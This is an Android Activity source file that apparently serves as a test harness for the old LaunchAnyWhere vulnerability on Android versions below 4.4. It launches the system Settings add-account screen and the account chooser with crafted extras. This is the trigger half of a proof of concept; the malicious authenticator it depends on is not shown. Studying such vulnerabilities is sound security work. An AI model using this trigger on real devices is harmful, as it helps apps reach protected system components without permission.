package com.tzx.launchanywhere;

import android.accounts.Account;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;

import java.util.ArrayList;

/**
 * Created by Tanzhenxing
 * Date: 2023/4/14 14:39
 * Description:测试4.4以下手机的LaunchAnyWhere漏洞
 */
public class TestLaunchAnyWhereActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_test_launchanywhere_layout);
        findViewById(R.id.button).setOnClickListener(this::openPage);
    }

    private void openPage(View view) {
        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
        intent1.setAction(Intent.ACTION_RUN);
        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String[] authTypes = {"com.tzx.launchanywhere"};
        intent1.putExtra("account_types", authTypes);
        intent1.putExtra("authTypes", authTypes);
        this.startActivity(intent1);
    }

    private void startAccountActivity() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("android", "android.accounts.ChooseTypeAndAccountActivity"));
        //intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$ChooseAccountActivity"));
        ArrayList<Account> allowableAccounts = new ArrayList<>();
        allowableAccounts.add(new Account("测试", "com.tzx.launchanywhere"));
        intent.putExtra("allowableAccounts", allowableAccounts);
        intent.putExtra("allowableAccountTypes", new String[]{"com.tzx.launchanywhere"});
        Bundle options = new Bundle();
        options.putBoolean("alivePullStartUp", true);
        intent.putExtra("addAccountOptions", options);
        intent.putExtra("descriptionTextOverride", " ");
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
    }
}
